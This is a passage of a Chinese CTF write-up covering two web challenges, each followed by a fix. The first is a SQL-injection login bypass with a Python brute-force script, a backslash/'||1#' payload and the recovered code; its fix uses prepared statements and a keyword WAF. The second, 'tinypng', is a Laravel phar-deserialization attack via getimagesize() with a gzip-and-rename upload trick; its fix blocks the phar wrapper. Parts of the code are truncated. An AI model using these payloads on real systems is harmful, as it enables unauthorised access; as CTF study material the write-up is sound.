            }
            req = r.post(url+"/login.php",data=data,allow_redirects=False)
            if 'fail' in req.text:
                rev_ans = ch+rev_ans
                print(ch+tmp,rev_ans)
                if len(tmp) == 3:
                    tmp = ch+tmp[:-1]
                else:
                    tmp = ch+tmp
                break
    '''
    g$ g
    ig$ ig
    2ig$ 2ig
    32ig 32ig
    u32i u32ig
    iu32 iu32ig
    uiu3 uiu32ig
    3uiu 3uiu32ig
    23ui 23uiu32ig
    h23u h23uiu32ig
    gh23 gh23uiu32ig
    igh2 igh23uiu32ig
    uigh uigh23uiu32ig
    ruig ruigh23uiu32ig
    hrui hruigh23uiu32ig
    ghru ghruigh23uiu32ig
    rghr rghruigh23uiu32ig
    ergh erghruigh23uiu32ig
    '''
    data = {
        "username":"admin\\",
        "password":"||1#",
        "code":"erghruigh2uygh23uiu32ig"
    }
    req = r.post(url+"/login.php",data=data)
    print(req.text)
因为没找到绕过拼接字符串的方法，题目中又对hex长度进行了限制，所以每三位推一位，最开始三位通过`^`和`$`的方式来匹配。
正着倒着结合一下就能拿到23位的code`erghruigh2uygh23uiu32ig`
###  修复思路
直接把sql全换成预处理形式防止注入
    conn = new mysqli($this->host,$this->user,$this->pass,$this->database);
            if(mysqli_connect_errno()){
                die('connect error');
            }
        }
        function find($username){
            $res = $this->conn->prepare("select * from users where username=?");
            $res->bind_param("s", $username);
            $res->execute();
            #$res = $this->conn->query();
            #$res->bind_result($district);
            $res->fetch();
            if($res->num_rows>0){
                return True;
            }
            else{
                return False;
            }
        }
        function register($username,$password,$code){
            $res = $this->conn->prepare("insert into users (username,password,code) values (?,?,?)");
            $res->bind_param("sss", $username,$password,$code);
            $res->execute();
            #$res = $this->conn->query();
            #$res->bind_result($district);
            if($res->execute()){
                $res->fetch();
                return True;
            }
            else{
                return False;
            }
        }
        function login($username,$password,$code){
            $res = $this->conn->prepare("select code from users where username=? and password=?");
            $res->bind_param("ss", $username,$password);
            $res->bind_result($code2);
            $res->execute();
            $res->fetch();
            #$res = $this->conn->query("select * from users where username='$username' and password='$password'");
            if($this->conn->error){
                return 'error';
            }
            else{
                #$content = $res->fetch_array();
                #var_dump($code2);
                if($code2===$_POST['code']){
                    $_SESSION['username'] = $username;
                    return 'success';
                }
                else{
                    return 'fail';
                }
            }
        }
    }
    function sql_waf($str){
        if(preg_match('/union|select|or|and|\'|"|sleep|benchmark|regexp|repeat|get_lock|count|=|>| $value) {
            if(is_array($value)){
                array_waf($value);
            }
            else{
                sql_waf($value);
                num_waf($value);
            }
        }
    }
## tinypng (BUUOJ 复现)
是一个laravel框架的题
那么首先关注路由和控制器
    name('file.upload.post');
    //Don't expose the /image to others!
    Route::get('/image', [ImageController::class, 'handle'])->name('image.handle');
这俩路由分别指向`IndexController`和`ImageController`
`fileupload`能上传，文件名文件类型不可控
    class IndexController extends Controller
    {
        public function fileUpload(Request $req)
        {
            $allowed_extension = "png";
            $extension = $req->file('file')->clientExtension();
            if($extension === $allowed_extension && $req->file('file')->getSize() file('file')->get();
                if (preg_match("/withErrors($error);
                }else {
                    $fileName = \md5(time()) . '.png';
                    $path = $req->file('file')->storePubliclyAs('uploads', $fileName);
                    echo "path: $path";
                    return back()
                        ->with('success', 'File has been uploaded.')
                        ->with('file', $path);
                }
            } else{
                $error = 'Don\'t do that, please';
                return back()
                    ->withErrors($error);
            }
        }
    }
image对文件调用了`imgcompress`
    class ImageController extends Controller
    {
        public function handle(Request $request)
        {
            $source = $request->input('image');
            if(empty($source)){
                return view('image');
            }
            $temp = explode(".", $source);
            $extension = end($temp);
            if ($extension !== 'png') {
                $error = 'Don\'t do that, pvlease';
                return back()
                    ->withErrors($error);
            } else {
                $image_name = md5(time()) . '.png';
                $dst_img = '/var/www/html/' . $image_name;
                $percent = 1;
                (new imgcompress($source, $percent))->compressImg($dst_img);
                return back()->with('image_name', $image_name);
            }
        }
    }
跟进可以发现调用了
    /**
     * 内部：打开图片
     */
    private function _openImage()
    {
        list($width, $height, $type, $attr) = getimagesize($this->src);
        $this->imageinfo = array(
            'width' => $width,
            'height' => $height,
            'type' => image_type_to_extension($type, false),
            'attr' => $attr
        );
        $fun = "imagecreatefrom" . $this->imageinfo['type'];
        $this->image = $fun($this->src);
        $this->_thumpImage();
    }
那么很明显利用的思路就是上传一个phar文件通过`getimagesize()`触发phar反序列化了
但是要绕过之前的
    if (preg_match("/ test3.phar
    gzip test3.phar
    mv test3.phar test3.png
###  修复思路
phar反序列化需要用到phar协议，那么在image路由处把phar协议ban了就行
    input('image');
            if(preg_match('/phar/i', $str)){
                die('Hack detected');
            }
            if(empty($source)){
                return view('image');
            }
            $temp = explode(".", $source);
            $extension = end($temp);
            if ($extension !== 'png') {
                $error = 'Don\'t do that, pvlease';
                return back()
                    ->withErrors($error);
            } else {
                $image_name = md5(time()) . '.png';
                $dst_img = '/var/www/html/' . $image_name;
                $percent = 1;
                (new imgcompress($source, $percent))->compressImg($dst_img);
                return back()->with('image_name', $image_name);
            }
        }
    }